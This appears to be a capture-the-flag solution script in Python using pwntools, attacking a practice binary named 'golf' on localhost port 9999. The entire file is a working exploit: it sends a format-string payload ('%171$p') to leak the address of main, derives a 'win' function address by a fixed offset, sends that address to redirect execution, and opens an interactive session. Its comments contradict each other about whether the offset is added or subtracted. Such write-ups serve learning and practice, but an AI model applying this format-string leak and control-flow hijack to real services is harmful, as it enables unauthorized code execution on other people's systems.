from pwn import *
from pwn import p64
elf = ELF("./golf")
#r = process(elf.path)
r = remote("localhost", 9999)

payload = "%171$p"
#main address leaks at 171th index
r.sendline(payload)
main_address = r.recvuntil(b"\n\n").split()
main_address = main_address[-1].decode('UTF-8')

main_address_int = int(main_address, 16)

#based on gdb reversing you can determine that the address of win is -26 so just subtract -26 from the main address and send the address so that it can jump to that address!
win_address = main_address_int-26
win_address = hex(win_address)

r.sendline(win_address)
#send and the offset between win and main is 26 -> need to add 26 to main to get to the address of win and send(???)
r.interactive()
